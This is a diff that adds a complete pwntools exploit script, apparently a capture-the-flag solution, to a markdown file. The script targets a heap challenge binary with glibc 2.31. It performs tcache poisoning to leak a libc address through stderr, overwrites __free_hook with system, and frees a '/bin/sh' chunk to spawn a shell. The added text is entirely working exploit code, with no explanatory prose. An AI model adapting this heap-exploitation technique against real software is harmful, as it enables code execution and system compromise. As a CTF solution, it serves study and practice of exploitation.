@@ -181,3 +181,92 @@ sla(b"Size: ", str(0x20))
 sa(b"Content: ", b"/bin/sh\0")
 sla(b"> ", b"3")
 ```
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+exe = ELF('./chall1_patched', checksec=False)
+libc = ELF('./libc-2.31.so')
+context.binary = exe
+
+
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+                c
+                ''')
+
+
+def info(msg): return log.info(msg)
+def sla(msg, data): return p.sendlineafter(msg, data)
+def sa(msg, data): return p.sendafter(msg, data)
+def sl(data): return p.sendline(data)
+def s(data): return p.send(data)
+
+
+if args.REMOTE:
+    p = remote('')
+else:
+    p = process(exe.path)
+
+GDB()
+sla(b"> ", b"1")
+sla(b"Size: ", str(0x20))
+sa(b"Content: ", str(0x20))
+sla(b"> ", b"3")
+
+sla(b"> ", b"2")
+sa(b"Content: ", b"\0" * 0x20)
+sla(b"> ", b"3")
+
+sla(b"> ", b"2")
+sa(b"Content: ", p64(exe.sym["stderr"]))
+
+sla(b"> ", b"1")
+sla(b"Size: ", str(0x20))
+sa(b"Content: ", b"abcde")
+
+sla(b"> ", b"1")
+sla(b"Size: ", str(0x20))
+sa(b"Content: ", b"\xc0")
+sla(b"> ", b"4")
+p.recvuntil(b"Content: ")
+
+libc_leak = u64(p.recv(6) + b"\0\0")
+libc.address = libc_leak - libc.sym['_IO_2_1_stderr_']
+info(hex(libc_leak))
+info(hex(libc.address))
+
+sla(b"> ", b"1")
+sla(b"Size: ", str(0x20))
+sa(b"Content: ", str(0x20))
+sla(b"> ", b"3")
+
+sla(b"> ", b"2")
+sa(b"Content: ", b"\0" * 16)
+sla(b"> ", b"3")
+
+sla(b"> ", b"2")
+sa(b"Content: ", p64(libc.sym['__free_hook']))
+
+sla(b"> ", b"1")
+sla(b"Size: ", str(0x20))
+sa(b"Content: ", str(0x20))
+
+sla(b"> ", b"1")
+sla(b"Size: ", str(0x20))
+sa(b"Content: ", b"aaa")
+
+sla(b"> ", b"2")
+sa(b"Content: ", p64(libc.sym['system']))
+
+sla(b"> ", b"1")
+sla(b"Size: ", str(0x20))
+sa(b"Content: ", b"/bin/sh\0")
+sla(b"> ", b"3")
+
+p.interactive()
+
+```
